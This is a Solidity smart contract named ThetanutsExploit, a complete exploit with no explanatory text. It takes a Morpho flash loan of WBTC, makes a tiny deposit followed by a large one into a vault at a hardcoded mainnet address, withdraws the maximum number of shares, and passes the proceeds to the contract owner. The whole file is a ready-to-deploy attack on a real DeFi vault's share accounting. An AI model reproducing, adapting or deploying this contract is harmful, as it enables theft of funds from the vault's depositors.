// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMorpho {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IThetanutsVault {
    function deposit(uint256 amount) external returns (uint256);
    function initWithdraw(uint256 shares) external returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract ThetanutsExploit {
    IERC20 public constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IMorpho public constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IThetanutsVault public constant VAULT = IThetanutsVault(0x80b8EEb34A2Ba5dd90c61e02a12eA30515dCa6f5);

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        WBTC.approve(address(VAULT), type(uint256).max);
        WBTC.approve(address(MORPHO), type(uint256).max);

        MORPHO.flashLoan(address(WBTC), 1_000_000_000, "");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        VAULT.deposit(2);
        VAULT.deposit(468_000_000);
        VAULT.initWithdraw(type(uint256).max);
    }

    function withdraw() external {
        uint256 bal = WBTC.balanceOf(address(this));
        WBTC.transfer(owner, bal);
    }
}
